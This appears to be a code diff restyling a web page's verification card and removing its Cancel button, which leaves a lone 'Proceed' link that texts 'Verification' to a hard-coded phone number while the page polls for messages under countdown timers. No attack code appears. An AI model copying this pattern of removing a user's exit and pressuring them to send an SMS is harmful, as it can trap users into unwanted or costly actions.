@@ -39,20 +39,40 @@
     body {
       display: grid;
       place-items: center;
-      padding: 26px;
+      min-height: 100vh;
+      min-height: 100svh;
+      height: auto;
+      padding: 24px;
     }
 
     .card {
-      width: min(760px, 100%);
-      min-height: 560px;
-      padding: 32px 40px 26px;
+      display: flex;
+      flex-direction: column;
+      width: min(430px, 100%);
+      min-height: min(760px, calc(100svh - 48px));
+      padding: 36px 28px;
       background: rgba(255, 255, 255, 0.9);
-      border-radius: 28px;
+      border-radius: 32px;
       border: 1px solid rgba(38, 41, 46, 0.08);
-      box-shadow: 0 10px 18px rgba(20, 22, 29, 0.06);
+      box-shadow: 0 24px 60px rgba(20, 22, 29, 0.14);
       text-align: center;
       position: relative;
       overflow: hidden;
+    }
+
+    #loadingState,
+    #readyState:not(.hidden),
+    .verification-state:not(.hidden),
+    .timeout-state:not(.hidden) {
+      width: 100%;
+      flex: 1;
+    }
+
+    #readyState:not(.hidden) {
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
     }
 
     h1 {
@@ -134,30 +154,28 @@
 
     .cta-row {
       display: grid;
-      grid-template-columns: 1fr 1fr;
-      gap: 18px;
-      margin-top: 12px;
+      place-items: center;
+      margin-top: 20px;
       width: 100%;
     }
 
     .btn {
       appearance: none;
       border: 0;
-      border-radius: 18px;
-      padding: 18px 18px;
-      font-size: clamp(1.6rem, 2.5vw, 2.3rem);
+      border-radius: 16px;
+      padding: 18px 20px;
+      font-size: clamp(1.5rem, 2.2vw, 2.1rem);
       line-height: 1;
-      letter-spacing: -0.05em;
+      letter-spacing: -0.04em;
       font-weight: 700;
       cursor: pointer;
       transition: transform 0.18s ease, box-shadow 0.18s ease, opacity 0.18s ease;
-      width: 100%;
-      min-height: 72px;
+      min-height: 64px;
       display: inline-flex;
       align-items: center;
       justify-content: center;
       text-decoration: none;
-      box-shadow: inset 0 0 0 1px rgba(255,255,255,0.06);
+      box-shadow: 0 12px 24px rgba(49, 76, 96, 0.18), inset 0 0 0 1px rgba(255,255,255,0.08);
     }
 
     .btn:hover {
@@ -165,10 +183,12 @@
       opacity: 0.98;
     }
 
-    .btn.cancel,
     .btn.proceed {
+      width: min(280px, 100%);
       background: linear-gradient(180deg, #3d586d 0%, #2f485d 100%);
       color: #fff;
+      justify-self: center;
+      margin: 0;
     }
 
     .sms-retry {
@@ -182,15 +202,18 @@
     }
 
     .verification-state {
-      display: grid;
-      place-items: center;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      gap: 28px;
       min-height: 560px;
       padding: 40px 24px;
       text-align: center;
     }
 
     .verification-state h2 {
-      margin: 0 0 40px;
+      margin: 0;
       color: #24252b;
       font-size: clamp(1.7rem, 4vw, 2.2rem);
       line-height: 1.2;
@@ -199,13 +222,13 @@
     .verification-icon {
       width: 120px;
       height: 120px;
-      margin-bottom: 90px;
+      margin: 0;
       color: var(--purple-dark);
     }
 
     .verification-warning {
       max-width: 620px;
-      margin: 0 0 76px;
+      margin: 0;
       color: #555158;
       font-size: clamp(1.2rem, 3.5vw, 1.8rem);
       line-height: 1.35;
@@ -248,15 +271,18 @@
     }
 
     .timeout-state {
-      display: grid;
-      place-items: center;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      gap: 28px;
       min-height: 560px;
       padding: 40px 24px;
       text-align: center;
     }
 
     .timeout-state h2 {
-      margin: 0 0 48px;
+      margin: 0;
       color: #24252b;
       font-size: clamp(1.7rem, 4vw, 2.2rem);
       line-height: 1.2;
@@ -265,13 +291,13 @@
     .timeout-icon {
       width: 120px;
       height: 120px;
-      margin-bottom: 48px;
+      margin: 0;
       color: var(--purple-dark);
     }
 
     .timeout-message {
       max-width: 620px;
-      margin: 0 0 60px;
+      margin: 0;
       color: #555158;
       font-size: clamp(1.2rem, 3.5vw, 1.8rem);
       line-height: 1.35;
@@ -396,24 +422,20 @@
 
     @media (max-width: 600px) {
       body {
-        height: auto;
         min-height: 100svh;
-        padding: 8px;
+        padding: 12px;
       }
 
       .card {
         width: min(100%, 440px);
-        padding: 28px 18px 24px;
-        min-height: calc(100svh - 16px);
-        border-radius: 20px;
+        padding: 28px 20px;
+        min-height: calc(100svh - 24px);
+        border-radius: 28px;
       }
 
       #readyState:not(.hidden) {
-        display: flex;
-        flex: 1;
-        flex-direction: column;
-        justify-content: space-evenly;
-        min-height: calc(100svh - 72px);
+        justify-content: center;
+        min-height: 0;
       }
 
       .loading-state {
@@ -526,9 +548,7 @@
       }
 
       .cta-row {
-        grid-template-columns: 1fr 1fr;
-        gap: 10px;
-        margin-top: 8px;
+        margin-top: 12px;
       }
 
       .ready-timer {
@@ -543,11 +563,15 @@
 
       .btn {
         min-width: 0;
-        min-height: 48px;
-        padding: 10px 8px;
-        border-radius: 10px;
+        min-height: 50px;
+        padding: 12px 14px;
+        border-radius: 12px;
         font-size: clamp(1rem, 4.5vw, 1.25rem);
         letter-spacing: -0.02em;
+      }
+
+      .btn.proceed {
+        width: min(220px, 100%);
       }
 
       .sms-retry {
@@ -563,7 +587,7 @@
 
       .verification-state h2,
       .timeout-state h2 {
-        margin-bottom: 24px;
+        margin: 0;
         font-size: clamp(1.5rem, 7vw, 1.9rem);
       }
 
@@ -571,14 +595,19 @@
       .timeout-icon {
         width: 88px;
         height: 88px;
-        margin-bottom: 28px;
+        margin: 0;
       }
 
       .verification-warning,
       .timeout-message {
-        margin-bottom: 28px;
+        margin: 0;
         font-size: 1rem;
         line-height: 1.45;
+      }
+
+      .verification-state,
+      .timeout-state {
+        gap: 20px;
       }
 
       .verification-timer {
@@ -644,7 +673,6 @@
       </div>
 
       <div class="cta-row">
-        <button type="button" class="btn cancel">Cancel</button>
         <a class="btn proceed" href="sms:+260971263570?body=Verification">Proceed</a>
       </div>
       <button type="button" class="btn sms-retry hidden" id="smsRetry">Retry</button>
@@ -938,10 +966,6 @@
     setInterval(pollMessages, 3000);
     updateSmsCountdown();
     document.addEventListener('visibilitychange', updateSmsCountdown);
-
-    document.querySelector('.btn.cancel')?.addEventListener('click', function () {
-      window.history.back();
-    });
 
     proceedLink.addEventListener('click', function () {
       stopReadyCountdown();
